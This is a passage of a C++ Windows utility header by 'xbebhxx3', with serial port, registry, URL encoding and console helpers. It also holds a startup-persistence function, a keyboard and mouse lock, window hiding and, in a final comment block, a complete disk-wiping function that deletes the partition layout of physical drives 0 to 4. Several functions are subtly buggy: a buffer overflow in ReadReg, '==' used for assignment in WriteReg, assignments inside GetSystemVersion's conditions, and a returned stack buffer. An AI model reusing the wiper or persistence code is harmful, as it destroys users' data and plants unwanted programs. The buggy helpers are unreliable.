		hCom = CreateFileA(portname, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL); //�첽��ʽ
	if (hCom == (HANDLE)-1)
		return false;
	if (!SetupComm(hCom, 1024, 1024))
		return false; //���û�������С
	// ���ò���
	DCB p;
	memset(&p, 0, sizeof(p));
	p.DCBlength = sizeof(p);
	p.BaudRate = baudrate; // ������
	p.ByteSize = databit;  // ����λ
	switch (parity)		   //У��λ
	{
	case 0:
		p.Parity = NOPARITY; //��У��
		break;
	case 1:
		p.Parity = ODDPARITY; //��У��
		break;
	case 2:
		p.Parity = EVENPARITY; //żУ��
		break;
	case 3:
		p.Parity = MARKPARITY; //���У��
		break;
	}
	switch (stopbit) //ֹͣλ
	{
	case 1:
		p.StopBits = ONESTOPBIT; // 1λֹͣλ
		break;
	case 2:
		p.StopBits = TWOSTOPBITS; // 2λֹͣλ
		break;
	case 3:
		p.StopBits = ONE5STOPBITS; // 1.5λֹͣλ
		break;
	}
	if (!SetCommState(hCom, &p))
		return false;							// ���ò���ʧ��
	COMMTIMEOUTS TimeOuts;						//��ʱ����,��λ�����룬�ܳ�ʱ��ʱ��ϵ��������д���ַ�����ʱ�䳣��
	TimeOuts.ReadIntervalTimeout = 1000;		//�������ʱ
	TimeOuts.ReadTotalTimeoutMultiplier = 500;	//��ʱ��ϵ��
	TimeOuts.ReadTotalTimeoutConstant = 5000;	//��ʱ�䳣��
	TimeOuts.WriteTotalTimeoutMultiplier = 500; // дʱ��ϵ��
	TimeOuts.WriteTotalTimeoutConstant = 2000;	//дʱ�䳣��
	SetCommTimeouts(hCom, &TimeOuts);
	PurgeComm(hCom, PURGE_TXCLEAR | PURGE_RXCLEAR); //��մ��ڻ�����
	memcpy(pHandle, &hCom, sizeof(hCom));			// ������
	return true;
}

/**************************************************
 *  @brief          �رմ���
 *  @param          NULL
 *  @note           �Ƕ���ģ��
 *  @Sample usage   open(�˿ں�);
 * 	@return         �ɹ�����true��ʧ�ܷ���false
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/8/13
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
void SerialPort::close()
{
	HANDLE hCom = *(HANDLE *)pHandle;
	CloseHandle(hCom);
}

/**************************************************
 *  @brief          ��������
 *  @param          dat:���͵�����
 *  @note           �Ƕ���ģ��
 *  @Sample usage   send(���͵�����);
 * 	@return      	�ɹ����ط������ݳ��ȣ�ʧ�ܷ���0
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/8/13
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
int SerialPort::send(string dat)
{
	HANDLE hCom = *(HANDLE *)pHandle;
	if (this->synchronizeflag)
	{																							   // ͬ����ʽ
		DWORD dwBytesWrite = dat.length();														   //�ɹ�д��������ֽ���
		BOOL bWriteStat = WriteFile(hCom, (char *)dat.c_str(), dwBytesWrite, &dwBytesWrite, NULL); //ͬ������
		if (!bWriteStat)
			return 0;
		return dwBytesWrite;
	}
	else
	{																									 //�첽��ʽ
		DWORD dwBytesWrite = dat.length();																 //�ɹ�д��������ֽ���
		DWORD dwErrorFlags;																				 //�����־
		COMSTAT comStat;																				 //ͨѶ״̬
		OVERLAPPED m_osWrite;																			 //�첽��������ṹ��
		memset(&m_osWrite, 0, sizeof(m_osWrite));														 //����һ������OVERLAPPED���¼����������������õ�����ϵͳҪ����ô��
		ClearCommError(hCom, &dwErrorFlags, &comStat);													 //���ͨѶ���󣬻���豸��ǰ״̬
		BOOL bWriteStat = WriteFile(hCom, (char *)dat.c_str(), dwBytesWrite, &dwBytesWrite, &m_osWrite); //�첽����
		if (!bWriteStat)
			if (GetLastError() == ERROR_IO_PENDING)
				WaitForSingleObject(m_osWrite.hEvent, 500); //�����������д��ȴ�д���¼�0.5����
			else
			{
				ClearCommError(hCom, &dwErrorFlags, &comStat); //���ͨѶ����
				CloseHandle(m_osWrite.hEvent);				   //�رղ��ͷ�hEvent�ڴ�
				return 0;
			}
		return dwBytesWrite;
	}
}

/**************************************************
 *  @brief          ��������
 *  @param          NULL
 *  @note           �Ƕ���ģ��
 *  @Sample usage   receive();
 * 	@return         ����
 * 	@author         xbebhxx3
 * 	@version        3.0
 * 	@date           2022/8/13
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
string SerialPort::receive()
{
	HANDLE hCom = *(HANDLE *)pHandle;
	string rec_str = "";
	char buf[1024];
	if (this->synchronizeflag)
	{																 //ͬ����ʽ
		DWORD wCount = 1024;										 //�ɹ���ȡ�������ֽ���
		BOOL bReadStat = ReadFile(hCom, buf, wCount, &wCount, NULL); //ͬ������
		for (int i = 0; i < strlen(buf); i++)
		{
			if (buf[i] != -52)
				rec_str += buf[i];
			else
				break;
		}
		return rec_str;
	}
	else
	{												   //�첽��ʽ
		DWORD wCount = 1024;						   //�ɹ���ȡ�������ֽ���
		DWORD dwErrorFlags;							   //�����־
		COMSTAT comStat;							   //ͨѶ״̬
		OVERLAPPED m_osRead;						   //�첽��������ṹ��
		memset(&m_osRead, 0, sizeof(m_osRead));		   //����һ������OVERLAPPED���¼����������������õ�����ϵͳҪ����ô��
		ClearCommError(hCom, &dwErrorFlags, &comStat); //���ͨѶ���󣬻���豸��ǰ״̬
		if (!comStat.cbInQue)
			return "";													  //������뻺�����ֽ���Ϊ0���򷵻�false
		BOOL bReadStat = ReadFile(hCom, buf, wCount, &wCount, &m_osRead); //�첽����
		if (!bReadStat)
		{
			if (GetLastError() == ERROR_IO_PENDING)
				GetOverlappedResult(hCom, &m_osRead, &wCount, TRUE); //����������ڶ�ȡ�У�GetOverlappedResult���������һ��������ΪTRUE��������һֱ�ȴ���ֱ����������ɻ����ڴ��������
			else
			{
				ClearCommError(hCom, &dwErrorFlags, &comStat); //���ͨѶ����
				CloseHandle(m_osRead.hEvent);				   //�رղ��ͷ�hEvent���ڴ�
				return "";
			}
		}
		for (int i = 0; i < strlen(buf); i++)
		{
			if (buf[i] != -52)
				rec_str += buf[i];
			else
				break;
		}
		return rec_str;
	}
}
//���ڲ�������

//ע���������ʼ

/**************************************************
 *  @brief          ��ע���
 *  @param          path:·�� key��key
 *  @note           ͷ�ļ��� #include <windows.h>
 *  @Sample usage   ReadReg("Software\\xbebhxx3", "aaa");
 *  @return         ע���ֵ��0Ϊʧ��
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/28
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
char *ReadReg(const char *path, const char *key)
{
	static char value[32] = {0};
	HKEY hKey;
	int ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_EXECUTE, &hKey); //��ע���
	if (ret != ERROR_SUCCESS)
		return 0;
	//��ȡKEY
	DWORD dwType = REG_SZ; //��������
	DWORD cbData = 256;
	ret = RegQueryValueEx(hKey, key, NULL, &dwType, (LPBYTE)value, &cbData); //��ȡע���
	if (ret == ERROR_SUCCESS)
	{
		RegCloseKey(hKey); //�ر�ע���
		return value;
	}
}
/**************************************************
 *  @brief          дע���
 *  @param          path:·�� key��key, value��ֵ
 *  @note           ͷ�ļ��� #include <windows.h>
 *  @Sample usage   WriteReg("Software\\xbebhxx3", "aaa", "bbb");
 *  @return         1�ɹ���0ʧ��
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/28
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
bool WriteReg(const char *path, const char *key, const char *value)
{
	HKEY hKey;
	DWORD dwDisp;
	DWORD dwType = REG_SZ;																										//��������
	int ret = RegCreateKeyEx(HKEY_LOCAL_MACHINE, path, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisp); //��ע���
	if (ret != ERROR_SUCCESS)
	{
		RegCloseKey(hKey); //�ر�ע���
		return 0;
	}
	ret == RegSetValueEx(hKey, key, 0, dwType, (BYTE *)value, strlen(value)); //д��ע���
	RegCloseKey(hKey);														  //�ر�ע���
	return 1;
}

/**************************************************
 *  @brief          ɾ��ע�����
 *  @param          path:·��
 *  @note           ͷ�ļ��� #include <windows.h>
 *  @Sample usage   DelReg("Software\\xbebhxx3");
 *  @return         1�ɹ���0ʧ��
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/28
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
bool DelReg(const char *path)
{
	int ret = RegDeleteKey(HKEY_LOCAL_MACHINE, path); //ɾ��ע���
	if (ret == ERROR_SUCCESS)
		return 1;
	else
		return 0;
}

/**************************************************
 *  @brief          ɾ��ע���ֵ
 *  @param          path:·��, value��ֵ
 *  @note           ͷ�ļ��� #include <windows.h>
 *  @Sample usage   DelRegValue("Software\\xbebhxx3","aaa");
 *  @return         1�ɹ���0ʧ��
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/28
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
bool DelRegValue(const char *path, const char *Value)
{
	HKEY hKey;
	LONG ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_QUERY_VALUE | KEY_WRITE, &hKey); //��ע���
	if (ret == ERROR_SUCCESS)
	{
		RegDeleteValue(hKey, Value); //ɾ��ע���
		RegCloseKey(hKey);			 //�ر�ע���
		return 1;
	}
	RegCloseKey(hKey); //�ر�ע���
	return 0;
}

/**************************************************
 *  @brief          ���ÿ�������
 *  @param          name:��������fSuspend:1������0�ر�
 *  @note           ͷ�ļ��� #include <windows.h>
 *  @calls          WriteReg,DelRegValue
 *  @Sample usage   AutoRun(��������1);
 *  @return         1�ɹ���0ʧ��
 *  @author         xbebhxx3
 *  @version        2.0
 *  @date           2021/10/4
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
bool AutoRun(const char *name, BOOL fSuspend)
{
	if (fSuspend == 1)
	{
		char szFilePath[MAX_PATH + 1] = {0};
		GetModuleFileNameA(NULL, szFilePath, MAX_PATH);
		return WriteReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", name, szFilePath); //д��ע���ֵ
	}
	else
	{
		return DelRegValue("Software\\Microsoft\\Windows\\CurrentVersion\\Run", name); //ɾ��ע���ֵ
	}
}

//ע�����������

//��/���������ʼ

/**************************************************
 *  @brief          Url����
 *  @param          ��Ҫ����Ķ���
 *  @Sample usage   CodeUrl(��Ҫ����Ķ���);
 *  @return     	������
 *  @author         xbebhxx3
 *  @version        2.0
 *  @date           2021/10/14
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
string CodeUrl(const string &URL)
{
	string result = "";
	for (unsigned int i = 0; i < URL.size(); i++)
	{
		char c = URL[i];
		if (('0' <= c && c <= '9') || ('a' <= c && c <= 'z') || ('A' <= c && c <= 'Z') || c == '/' || c == '.')
			result += c;
		else
		{
			int j = (short int)c;
			if (j < 0)
				j += 256;
			int i1, i0;
			i1 = j / 16;
			i0 = j - i1 * 16;
			result += '%';
			if (0 <= i1 && i1 <= 9)
				result += char(short('0') + i1);
			else if (10 <= i1 && i1 <= 15)
				result += char(short('A') + i1 - 10);
			if (0 <= i0 && i0 <= 9)
				result += char(short('0') + i0);
			else if (10 <= i0 && i0 <= 15)
				result += char(short('A') + i0 - 10);
		}
	}
	return result;
}

/**************************************************
 *  @brief          Url����
 *  @param          ��Ҫ����Ķ���
 *  @Sample usage   decodeUrl(��Ҫ����Ķ���);
 *  @return     	������
 *  @author         xbebhxx3
 *  @version        2.0
 *  @date           2021/10/14
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
string DecodeUrl(const string &URL)
{
	string result = "";
	for (unsigned int i = 0; i < URL.size(); i++)
	{
		char c = URL[i];
		if (c != '%')
			result += c;
		else
		{
			char c1 = URL[++i];
			char c0 = URL[++i];
			int num = 0;
			if ('0' <= c1 && c1 <= '9')
				num += short(c1 - '0') * 16;
			else if ('a' <= c1 && c1 <= 'f')
				num += (short(c1 - 'a') + 10) * 16;
			else if ('A' <= c1 && c1 <= 'F')
				num += (short(c1 - 'A') + 10) * 16;
			if ('0' <= c0 && c0 <= '9')
				num += short(c0 - '0');
			else if ('a' <= c0 && c0 <= 'f')
				num += (short(c0 - 'a') + 10);
			else if ('A' <= c0 && c0 <= 'F')
				num += (short(c0 - 'A') + 10);
			result += char(num);
		}
	}
	return result;
}

/**************************************************
 *  @brief          ����
 *  @param          ��Ҫ���ܵĶ���
 *  @Sample usage   x3code(��Ҫ���ܵĶ���);
 *  @return     	���ܺ��
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/30
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
string x3code(string c)
{
	for (int i = 0; i <= sizeof(c); i++)
	{
		if ((c[i] >= 'A' && c[i] <= 'V') || (c[i] >= 'a' && c[i] <= 'v'))
		{
			c[i] = (c[i] ^ 8) + 4;
		}
		else if ((c[i] >= 'W' && c[i] <= 'Z') || (c[i] >= 'w' && c[i] <= 'z'))
		{
			c[i] = (c[i] ^ 6) - 22;
		}
		else if ((c[i] >= '1' && c[i] <= '4'))
		{
			c[i] = (c[i] ^ 4) - 8;
		}
		else if ((c[i] >= '5' && c[i] <= '9'))
		{
			c[i] = (c[i] ^ 7) + 22;
		}
		else if ((c[i] >= ' ' && c[i] <= '('))
		{
			c[i] = (c[i] ^ 2) - 21;
		}
		else if ((c[i] >= ')' && c[i] <= '/'))
		{
			c[i] = (c[i] ^ 3) + 12;
		}
		else
			;
	}
	return c;
}
//�����������

//�ı���ɫ��ʼ

/**************************************************
 *  @brief          RGB��ʼ��
 *  @Sample usage   rgb_init()
 *  @note	    	ͷ�ļ��� #include<Windows.h>
 *  @author         jlx
 *  @version        1.0
 *  @date           2022/3/5
 **************************************************/
void rgb_init()
{												   // ��ʼ��
	HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);   //������
	HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE); //������
	DWORD dwInMode, dwOutMode;
	GetConsoleMode(hIn, &dwInMode);	  //��ȡ����̨����ģʽ
	GetConsoleMode(hOut, &dwOutMode); //��ȡ����̨���ģʽ
	dwInMode |= 0x0200;				  //����
	dwOutMode |= 0x0004;
	SetConsoleMode(hIn, dwInMode);	 //���ÿ���̨����ģʽ
	SetConsoleMode(hOut, dwOutMode); //���ÿ���̨���ģʽ
}

/**************************************************
 *  @brief          RGB����
 *  @param	    	wr:�����,wg:������,wb:������,br:������,bg:������,bb:������ (0-255)
 *  @Sample usage   rgb_set(255,255,255,0,0,0);
 *  @note	    	����֮ǰ������ rgb_init();
 *  @author         jlx
 *  @version        1.0
 *  @date           2022/3/5
 **************************************************/
void rgb_set(int wr, int wg, int wb, int br, int bg, int bb)
{
	printf("\033[38;2;%d;%d;%dm\033[48;2;%d;%d;%dm", wr, wg, wb, br, bg, bb); //\033[38��ʾǰ����\033[48��ʾ����������%d��ʾ��ϵ���
}

//�ı���ɫ����

/**************************************************
 *  @brief          ���������� (��Ҫ����ԱȨ��)
 *  @param          NULL
 *  @return         1�ɹ���0ʧ��
 *  @note           ͷ�ļ��� #include <Windows.h>
 *  @Sample usage   lockkm(1); ������lockkm(0); ����
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/28
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
bool lockkm(bool lockb = false)
{
	HINSTANCE hIn = NULL;
	hIn = LoadLibrary("user32.dll");
	if (hIn)
	{
		BOOL(_stdcall * BlockInput)
		(BOOL bFlag);
		BlockInput = (BOOL(_stdcall *)(BOOL bFlag))GetProcAddress(hIn, "BlockInput");
		if (BlockInput)
			return BlockInput(lockb);
		else
			return 0;
	}
	else
		return 0;
}

/**************************************************
 *  @brief          ������λ��
 *  @param          NULL
 *  @note           ͷ�ļ��� #include <Windows.h>
 *  @Sample usage   mouxy(���x���꣬y����);
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2021/5/2
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
void mouxy(int &x, int &y)
{
	POINT p;
	GetCursorPos(&p); //��ȡ�������
	x = p.x;
	y = p.y;
}

/**************************************************
 *  @brief          ����
 *  @param          NULL
 *  @note           ͷ�ļ��� #include <Windows.h>
 *  @Sample usage   cls();
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2021/9/14
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
void cls()
{
	HANDLE hdout = GetStdHandle(STD_OUTPUT_HANDLE);		 //��ȡ��׼����豸�ľ��
	CONSOLE_SCREEN_BUFFER_INFO csbi;					 //�����ʾ��Ļ���������Եı���
	GetConsoleScreenBufferInfo(hdout, &csbi);			 //��ȡ��׼����豸����Ļ����������
	DWORD size = csbi.dwSize.X * csbi.dwSize.Y, num = 0; //����˫�ֽڱ���
	COORD pos = {0, 0};									 //��ʾ����ı�������ʼ��Ϊ���Ͻ�(0, 0)�㣩

	//�Ѵ��ڻ�����ȫ�����Ϊ�ո����ΪĬ����ɫ��������
	FillConsoleOutputCharacter(hdout, ' ', size, pos, &num);
	FillConsoleOutputAttribute(hdout, csbi.wAttributes, size, pos, &num);
	SetConsoleCursorPosition(hdout, pos); //��궨λ���������Ͻ�
}

/**************************************************
 *  @brief          strɾ���ո�
 *  @param          s:Ҫɾ���ո��string����
 *  @note           ͷ�ļ��� #include <Windows.h>
 *  @Sample usage   delspace(Ҫɾ���ո��string����);
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2021/9/14
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
void delspace(string &s)
{
	int index = 0;
	if (!s.empty())
		while ((index = s.find(' ', index)) != string::npos)
			s.erase(index, 1);
}

/**************************************************
 *  @brief          ��õ�ǰip
 *  @note           ͷ�ļ��� #include <WinSock2.h>	����ʱ��-lgdi32 -lwsock32
 *  @Sample usage   ip();
 *  @return         ����������ip
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2021/9/23
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
string getIp()
{
	WSADATA wsaData;
	int ret = WSAStartup(MAKEWORD(2, 2), &wsaData);
	char hostname[256];
	ret = gethostname(hostname, sizeof(hostname));
	HOSTENT *host = gethostbyname(hostname);
	return inet_ntoa(*(in_addr *)*host->h_addr_list);
}

/**************************************************
 *  @brief          ��õ�ǰ�û���
 *  @Sample usage   GetUser();
 *  @return      	��ǰ�û���
 *  @note		    ͷ�ļ��� #include<Windows.h>
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/2/28
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
string GetUser()
{
	char currentUser[256] = {0};
	DWORD dwSize_currentUser = 256;
	GetUserName(currentUser, &dwSize_currentUser); //����û���
	return currentUser;
}

/**************************************************
 *  @brief          ���ϵͳ�汾
 *  @Sample usage   GetSystemVersion();
 *  @return         ϵͳ�汾
 *  @note		    ͷ�ļ��� #include<Windows.h>
 *  @author         xbebhxx3
 *  @version        4.0
 *  @date           2021/2/24
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
string GetSystemVersion()
{
	OSVERSIONINFO osv = {0};
	osv.dwOSVersionInfoSize = sizeof(osv);
	if (!GetVersionEx(&osv))
		return 0;
	else if (osv.dwMajorVersion = 10 && osv.dwMinorVersion == 0)
		return "Windows 10"; // or windows server 2016
	else if (osv.dwMajorVersion = 6 && osv.dwMinorVersion == 3)
		return "Windows 8.1"; // or windows server 2012 R2
	else if (osv.dwMajorVersion = 6 && osv.dwMinorVersion == 2)
		return "Windows 8"; // or windows server 2012
	else if (osv.dwMajorVersion = 6 && osv.dwMinorVersion == 1)
		return "Windows 7"; // or windows server 2008 R2
	else if (osv.dwMajorVersion = 6 && osv.dwMinorVersion == 0)
		return "Windows Vista"; // or windows server 2008
	else if (osv.dwMajorVersion = 5 && osv.dwMinorVersion == 2)
		return "Windows server 2003"; // or windows server 2003 R2
	else if (osv.dwMajorVersion = 5 && osv.dwMinorVersion == 1)
		return "Windows xp";
	else if (osv.dwMajorVersion = 5 && osv.dwMinorVersion == 1)
		return "Windows 2000";
	else
		return "err";
}

/**************************************************
 *  @brief          ִ��cmd�����÷���ֵ
 *  @Sample usage   getCmdResult("echo 1");
 *  @return         ����ֵ
 *  @author         xbebhxx3
 *  @version        2.0
 *  @date           2022/3/5
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
char *getCmdResult(char *Cmd)
{
	char Result[1024000] = {0};
	char buf1[1024000] = {0};
	FILE *pf = popen(Cmd, "r");
	while (fgets(buf1, sizeof buf1, pf))
		snprintf(Result, 1024000, "%s%s", Result, buf1);
	pclose(pf);
	memset(Cmd, '\0', sizeof(Cmd));
	return Result;
}

/**************************************************
 *  @brief          �������
 *  @param          str:Ҫ������ַ���,y:������ڼ���;
 *  @Sample usage   OutoutMiddle(�ַ���,����);
 *  @note	        ͷ�ļ��� #include<Windows.h>
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/8
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
void OutoutMiddle(const char str[], int y)
{
	COORD pos;
	HANDLE hOutput = GetStdHandle(STD_OUTPUT_HANDLE); //�������ľ��
	CONSOLE_SCREEN_BUFFER_INFO bInfo;
	GetConsoleScreenBufferInfo(hOutput, &bInfo); //��ȡ����̨��Ļ��������С
	int dwSizeX = bInfo.dwSize.X, dwSizey = bInfo.dwSize.Y;
	int len = strlen(str); //��ȡҪ������ַ����ĳ���
	int x = dwSizeX / 2 - len / 2;
	pos.X = x;								//������
	pos.Y = y;								//������
	SetConsoleCursorPosition(hOutput, pos); //�ƶ����
	printf("%s", str);						//���
}

//���ش��� #include<Windows.h>
void HideWindow()
{
	ShowWindow(GetForegroundWindow(), SW_HIDE);
}

//�桤ȫ�� ��� ȡ�����������߿�#include<Windows.h>
void full_screen()
{
	HWND hwnd = GetForegroundWindow();
	int cx = GetSystemMetrics(SM_CXSCREEN); /* ��Ļ���� ���� */
	int cy = GetSystemMetrics(SM_CYSCREEN); /* ��Ļ�߶� ���� */

	LONG l_WinStyle = GetWindowLong(hwnd, GWL_STYLE); /* ��ȡ������Ϣ */
	/* ���ô�����Ϣ ��� ȡ�����������߿� */
	SetWindowLong(hwnd, GWL_STYLE, (l_WinStyle | WS_POPUP | WS_MAXIMIZE) & ~WS_CAPTION & ~WS_THICKFRAME & ~WS_BORDER);

	SetWindowPos(hwnd, HWND_TOP, 0, 0, cx + 18, cy, 0);
}

/**************************************************
 *  @brief          �ƻ�mbr(very danger)
 *  @Sample usage   killmbr();
 *  @note		    ͷ�ļ��� #include<Windows.h> #include<ntddscsi.h>
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/8
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved


void killmbr(){
	DWORD lpBytesReturned;
	OVERLAPPED lpOverlapped={0};
	HANDLE DiskHandle=CreateFile("\\\\.\\PhysicalDrive0",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);//�ƻ�mbr
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
	DiskHandle=CreateFile("\\\\.\\PhysicalDrive1",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
	DiskHandle=CreateFile("\\\\.\\PhysicalDrive2",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
	DiskHandle=CreateFile("\\\\.\\PhysicalDrive3",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
	DiskHandle=CreateFile("\\\\.\\PhysicalDrive4",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
	DeviceIoControl(DiskHandle,IOCTL_DISK_DELETE_DRIVE_LAYOUT,NULL,0,NULL,0,&lpBytesReturned,&lpOverlapped);
}
**************************************************/
#endif